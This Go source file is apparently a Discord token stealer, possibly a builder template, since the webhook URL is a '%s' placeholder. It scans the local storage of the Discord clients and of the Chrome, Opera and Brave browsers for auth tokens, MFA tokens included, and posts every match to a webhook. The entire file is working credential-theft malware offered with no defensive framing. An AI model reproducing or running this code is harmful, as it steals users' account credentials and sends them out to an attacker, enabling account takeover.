package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"regexp"
	"strings"
)

func sendWebhook(message string) {
	url := "%s"
	values := map[string]string{
		"content": message,
	}
	jsonData, err := json.Marshal(values)
	if err != nil {
		return
	}
	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return
	}

	var res map[string]interface{}

	json.NewDecoder(resp.Body).Decode(&res)

}

func getTokens() {
	ROAMING := os.Getenv("APPDATA")
	LOCAL := os.Getenv("LOCALAPPDATA")
	tokens := []string{}
	PATHS := map[string]string{
		"Discord":        ROAMING + "\\Discord",
		"Discord Canary": ROAMING + "\\discordcanary",
		"Discord PTB":    ROAMING + "\\discordptb",
		"Google Chrome":  LOCAL + "\\Google\\Chrome\\User Data\\Default",
		"Opera":          ROAMING + "\\Opera Software\\Opera Stable",
		"Brave":          LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
	}

	for _, path := range PATHS {
		if _, err := os.Stat(path); err == nil {
			path += "\\Local Storage\\leveldb\\"
			files, err := ioutil.ReadDir(path)
			if err != nil {
				continue
			}
			for _, file := range files {
				if strings.HasSuffix(file.Name(), ".ldb") || strings.HasSuffix(file.Name(), ".log") {
					data, err := ioutil.ReadFile(path + file.Name())
					if err != nil {
						fmt.Println(err)
						continue
					}
					reNotmfa, err := regexp.Compile(`[\w-]{24}\.[\w-]{6}\.[\w-]{27}`)
					if err == nil {
						if string(reNotmfa.Find(data)) != "" {
							tokens = append(tokens, string(reNotmfa.Find(data)))
						}
					}
					reMfa, err := regexp.Compile(`mfa\.[\w-]{84}`)
					if err == nil {
						if string(reMfa.Find(data)) != "" {
							tokens = append(tokens, string(reMfa.Find(data)))
						}
					}
				}
			}
		} else {
			continue
		}
	}
	content := strings.Join(tokens, "``\n``")
	sendWebhook("**" + fmt.Sprint(len(tokens)) + " TOKENS FOUND :** \n\n``" + content + "``")
}

func main() {
	getTokens()
}
